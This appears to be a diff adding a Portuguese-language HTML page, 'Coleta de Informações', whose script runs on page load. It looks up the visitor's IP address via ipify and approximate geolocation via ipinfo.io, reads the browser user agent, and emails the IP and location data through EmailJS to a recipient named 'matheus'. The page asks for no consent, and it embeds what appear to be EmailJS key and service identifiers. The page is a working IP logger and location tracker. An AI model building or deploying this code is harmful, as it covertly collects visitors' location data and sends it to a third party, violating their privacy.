@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Coleta de Informações</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+
+<body>
+    <h1>Coleta de Informações</h1>
+    <p>Seu endereço IP: <span id="ip"></span></p>
+    <p>Seu navegador: <span id="browser"></span></p>
+    <h1>Localização exata do usuário enviada por e-mail</h1>
+
+    <script>
+        emailjs.init('LgL4gIRZJ95YgD3ll');
+
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log(data);
+                document.getElementById('ip').textContent = data.ip;
+
+                fetch('https://ipinfo.io', {
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                    .then(response => response.json())
+                    .then(location => {
+                        console.log(location);
+                        console.log('Localização aproximada:', location.city + ', ' + location.region + ', ' + location.country);
+
+                        var params = {
+                            from_name: "script",
+                            to_name: "matheus",
+                            message: `
+                                ${JSON.stringify(location)}
+                                ${JSON.stringify(data)} <br>
+                            `,
+                            reply_to: "teste",
+                        }
+                        emailjs.send("service_rhiqbcl", "template_e1b1wbt", params)
+                            .then(function (response) {
+                                console.log('E-mail enviado com sucesso:', response);
+                            }, function (error) {
+                                console.error('Erro ao enviar o e-mail:', error);
+                            });
+                    })
+                    .catch(error => {
+                        console.error('Erro ao obter a localização:', error);
+                    });
+
+            });
+
+        document.getElementById('browser').textContent = navigator.userAgent;
+    </script>
+</body>
+
+</html>
